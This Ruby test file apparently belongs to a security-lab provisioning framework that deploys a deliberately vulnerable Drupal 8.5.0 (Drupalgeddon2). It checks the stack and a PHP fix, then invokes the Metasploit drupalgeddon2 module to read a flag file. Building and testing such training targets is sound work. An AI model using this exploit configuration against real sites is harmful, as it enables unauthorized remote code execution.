require_relative '../../../../../lib/post_provision_test'

# Drupal 8.5.0 (Drupalgeddon2, CVE-2018-7600) on patched PHP 7.4 (php7_patched).
# tier 2 proves the stack serves (a Drupal 200 means Apache -> php-fpm -> PHP ->
# MySQL all work) and that the php2shell fix is present, so only the app's own
# CVE is exploitable. tier 3 (the msf exploit) is deferred to a scenario with an
# attacker VM.
class Drupal850Test < PostProvisionTest
  FIX_COMMIT = '712e60f9edfd03f0960fc4fc3c2c375f42b90aa2'.freeze

  def initialize
    self.module_name = 'drupal_850'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    tier(1) do
      test_local_command('drupal docroot exists', 'test -d /var/www/drupal-8.5.0 && echo ok', 'ok')
      test_local_command('apache2 installed', 'dpkg -l apache2 | grep -E "^ii"', 'apache2')
      test_local_command('patched php present', 'test -x /opt/php-7.4-patched/bin/php && echo ok', 'ok')
    end
    tier(2) do
      test_service_up
      # Serving a Drupal page proves Apache -> php-fpm -> PHP -> MySQL end to end
      # (Drupal 500s if the DB is unreachable). Match the page body, not
      # curl's %{http_code} (the % is eaten by the guest-agent exec path). Retry
      # a few times in case the first request is still warming caches.
      test_local_command('drupal serves (Apache+php-fpm+DB)',
                         "for i in $(seq 1 15); do curl -s http://127.0.0.1:#{self.port}/ | grep -q Drupal && { echo SERVED_DRUPAL; break; }; sleep 2; done", 'SERVED_DRUPAL')
      # php2shell closed: patched build is in place (provenance, not exploit).
      test_local_command('php2shell fix present (CVE-2026-109618/109619)',
                         'cat /opt/php-7.4-patched/PHP2SHELL_FIX_COMMIT', FIX_COMMIT)
    end
    # tier 3 (exploit): Drupalgeddon2 (CVE-2018-7600), unauthenticated RCE via a
    # crafted HTTP request to the Drupal form API. The exploit runs as www-data,
    # which can read flag.txt (0640 www-data:www-data) in sites/default/.
    # php/unix/cmd/generic is required: cmd/unix/generic is not compatible with
    # PHP-platform exploits. AllowNoCleanup is required because the payload
    # cannot clean up the files it writes to the target via PHP.
    tier(3) do
      test_msf_exploit('exploit/unix/webapp/drupal_drupalgeddon2',
                       rport: self.port,
                       payload: 'php/unix/cmd/generic',
                       options: { 'AllowNoCleanup' => 'true' },
                       collect: 'cat /var/www/drupal-8.5.0/sites/default/flag.txt 2>/dev/null')
    end
  end
end

Drupal850Test.new.run
